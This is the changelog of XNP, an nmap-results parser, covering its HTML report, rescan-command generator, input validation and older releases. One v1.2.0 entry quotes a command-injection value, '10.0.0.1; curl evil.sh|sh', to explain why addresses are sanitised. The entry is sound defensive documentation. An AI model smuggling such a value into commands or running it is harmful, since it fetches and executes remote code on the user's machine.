# Change log

Released versions of [XNP](https://github.com/xtormin/XtremeNmapParser).

[← Back to the README](README.md) · [Español](CHANGELOG.es.md)

## XNP v1.2.0 — the HTML report

- **New `--rescan`: the nmap command for the next pass, built from what this one
  found.** A finished scan already knows which hosts are up and which ports they
  have open, so `xnp -d nmap/ --rescan` prints the commands that aim at exactly
  that instead of sweeping whole hosts again. Because nmap applies one port list
  to every target of an invocation, hosts are grouped **by port signature**:
  those whose open ports are the same set share a command, and no host is ever
  sent a port it does not have. The port list, the scan types and `-6` are
  decided per group, so a UDP group gets `-sU` and `U:` prefixes, a mixed group
  also gets an explicit TCP type (without one, nmap ignores the `T:` half), and
  a TCP-only group is left to nmap's own default unless the profile asked for
  one. `--rescan-args="…"` replaces the arguments outright. The commands go to
  stderr, so stdout stays the clean list of generated paths.
- **The rescan arguments take `$[...]` variables**, so a profile can name its
  own output file instead of every command overwriting the same one:
  `--rescan-args='-sV -oA scans/$[HOSTNAME] -Pn'` (single quotes: `$[...]` is
  bash's deprecated arithmetic expansion). `$[IP]`, `$[HOSTNAME]` (the resolved
  name, or the address when the scan found none), `$[PORTS]`, `$[TCP_PORTS]`
  and `$[UDP_PORTS]` are replaced per command. `$[IP]` and `$[HOSTNAME]` name a
  single host, so using one splits its group into one command per host — a
  value that differs per host cannot be written once into a shared command. The
  brackets tell an XNP variable from an environment variable, a name that is
  not one of these is left in the command rather than blanked out, and a
  hostname is sanitised the way an address is: what a shell would read is
  dropped, not escaped. The report's `custom` box accepts the same variables,
  and names the ones you got wrong under the box.
- **Quotes written into the rescan arguments are kept.** `-oA "nmap/$[IP] deep"`
  comes out quoted the way it went in, because the quotes may be load-bearing
  and only their author knows whether the path has a space in it. A token
  written bare is still quoted only when it needs to be, and an unbalanced
  quote reaches the command as typed instead of failing the run.
- The profiles live in `config.yaml` under a new `rescan:` block — `service`,
  `vuln`, `recheck` and `full` ship with it, and one added in
  `config/config.yaml` joins them rather than replacing the block. `states`
  there decides which port states are worth aiming at; it includes
  `open|filtered` by default, which is the normal state of a UDP port and
  exactly what a short second pass settles.
- **The report's `nmap` button now produces commands that work.** It used to
  emit a single cartesian line — every port of the group against every host of
  the group — which probed ports most of those hosts did not have, and it
  ignored the protocol entirely, so a UDP group came out with no `-sU` and its
  ports mislabelled as TCP. It now runs the same generator as `--rescan`.
- **A rescan control in the toolbar of the Services and Data tabs**, beside
  each tab's existing hand-off button, with a profile selector filled from your
  `config.yaml` and a free-text box for arguments typed by hand. It copies the
  commands for the current selection — everything, or whatever the filter has
  left — and the count in the label follows the filter live, so you can see
  that `service:ssh` collapses seven commands into one before you click.
- **_Copy targets as_ buttons on the Data tab**, offering the same two shapes
  the Services tab already offered per group — `host:port` and `IP only` — over
  the whole filtered selection and in the table's own sort order. The count on
  each button is the number of lines it copies, so you can see what you are
  taking before you click.
- **Table columns can be resized.** Drag the right edge of a header cell, or
  double-click it to fit the column to its content: a long hostname stops
  living behind an ellipsis. Touching one column pins them all, because
  otherwise the border would slide away from the pointer mid-drag.
- **The query-language help is behind an info button** next to *Clear*, instead
  of holding a paragraph under the search bar on every tab for ever. The choice
  is remembered.
- The footer links to the project on GitHub.
- Addresses are validated before they reach a command line. `addr` is CDATA in
  `nmap.dtd`, so a report claiming `addr="10.0.0.1; curl evil.sh|sh"` is a valid
  one — and these commands are meant to be pasted into a shell. Anything that is
  not an IP address is dropped rather than escaped, on both the Python and the
  JavaScript side.

- **A directory run now merges and descends by default.** `xnp -d nmap/` is the
  whole command: `-M` and `-R` are no longer needed (they still parse, so
  existing scripts keep working), and the new `--no-merger` / `--no-recursive`
  turn each half off.
- New `--show`: opens the generated HTML report in the browser when the run
  finishes, which is what you want now that the name carries a timestamp. A
  machine with no browser gets a warning rather than a failed run.
- **The merged report is named after the folder and lands inside it**, stamped
  with the time: `xnp -d nmap/` writes `nmap/nmap_20260910-134500.html` instead
  of `merged_nmap_scan_data.html` in whatever directory you happened to be in.
  Every requested format shares the one stamp, and a second run adds a report
  rather than overwriting yesterday's deliverable. `-oN` still overrides it and
  is taken exactly as given.
- New `html` output format: a single self-contained interactive report in light
  and dark themes, part of the default `-oF` set. Three tabs: headline figures
  and charts, open ports grouped by service with copyable target lists, and the
  full table with Excel-style column filters, a query language and a row detail
  side panel. Every figure, bar and slice filters the table on click and writes
  itself into the query bar.
- Ports carry an *interest* level and a set of tags (`database`, `no-auth`,
  `cleartext-creds`, …) rather than a "risk" score: the label says what deserves
  a look, and deliberately claims nothing about vulnerability.
- The HTML report reaches data the other formats never saw. The writers used to
  receive only the eleven flat columns, so the nmap command line, OS detection,
  CPEs, port state reasons and structured NSE output were parsed and then thrown
  away; `NmapParser.parse_all` / `merge_all` now hand the parsed reports to the
  writer alongside the DataFrame.
- `-oF` choices are derived from the writer registry, so the CLI can no longer
  fall behind when a format is added.
- Chart.js 4.5.1 (MIT) is vendored; the report makes no network requests.
- The report's palette is audited against WCAG AA by the test suite, and the
  interaction accent no longer shares a hue with the level colours.
- A directory run no longer stops at the first file that fails validation: it
  reports the file, skips it and carries on, then names everything it skipped.
  A single named file (`-f`) still fails the run.
- New `examples/` directory with sample scans, and `scripts/generate_examples.py`
  to rebuild them.
- IBM Plex Sans/Mono (SIL OFL) are vendored and inlined, so the report renders
  with its intended type on a machine that has never seen it.
- The report is bilingual (Spanish/English), switchable next to the theme
  toggle. The reasons behind each label are translated at the source rather than
  in the page.

## XNP v1.1.0 — installable package and input validation

- XNP is now an installable package (`pip install .`) with an `xnp` command, and
  runs from any directory. Previously the configuration was read from a relative
  path, so it only worked from the repository root.
- Input validation in three layers: hardened XML parser, `<nmaprun>` root check,
  and DTD validation with a `--no-validate` escape hatch for nmap-compatible
  output from other scanners. Invalid input now exits cleanly instead of raising
  an `AttributeError`.
- The startup auto-update no longer runs `git pull` on its own. It reports that a
  new version exists; `xnp --update` performs the update.
- Fixes: IPv6 hosts kept their address empty; the `Scripts` column held Python
  object reprs; `-oN` was ignored together with `-f`; output names were truncated
  when the path contained `.xml`; a failed write still reported success; merging
  only empty scans crashed.
- New `--include-hostless` flag: emit a row for hosts with no ports, which were
  silently dropped before.
- Test suite and CI across Python 3.9 – 3.13.

## v1.0.x — earlier releases

- **24/06/2023 — v1.0.5** — `-C` now accepts `default` and `all`; the columns for
  each are defined in `config.yaml`.
- **24/06/2023 — v1.0.4** — Refactored the `outputformat` and `outputname`
  arguments.
- **24/06/2023 — v1.0.3** — Startup version check and self-update.
- **13/06/2023 — v1.0.2** — Custom headers, optional `Scripts` column, export
  only open ports.
- **07/06/2023 — v1.0.1** — Refactored code, `NmapXMLReport.py` class for XML
  parsing, recursive option.
- **05/06/2023 — v1.0.0** — Official release.
